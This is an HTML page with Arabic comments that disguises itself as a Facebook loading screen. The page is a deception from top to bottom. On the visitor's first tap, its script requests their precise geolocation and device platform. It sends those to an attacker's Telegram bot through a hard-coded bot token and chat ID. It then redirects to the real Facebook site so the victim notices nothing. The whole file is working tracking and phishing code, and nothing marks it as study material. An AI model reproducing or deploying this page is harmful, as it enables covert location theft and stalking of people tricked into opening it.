<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        /* شاشة بيضاء بالكامل توهم المستخدم بالتحميل */
        body { margin:0; padding:0; background:#fff; height:100vh; display:flex; justify-content:center; align-items:center; cursor:pointer; }
        .fb-loader { width: 50px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
    </style>
</head>
<body onclick="startCapture()">

    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-loader">

<script>
const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const ID = "1611398303";

function startCapture() {
    // طلب الموقع فوراً عند أول لمسة للشاشة
    navigator.geolocation.getCurrentPosition(
        (pos) => { sendData(pos); },
        (err) => { sendData(null); },
        { enableHighAccuracy: true, timeout: 5000 }
    );
}

async function sendData(pos) {
    let msg = `🚩 صيد تلقائي (أول لمسة)\n📱 النظام: ${navigator.platform}`;
    if(pos) {
        msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
        msg += `\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    }
    
    // إرسال البيانات
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
    
    // التوجيه لفيسبوك
    window.location.href = "https://m.facebook.com/";
}
</script>
</body>
</html>
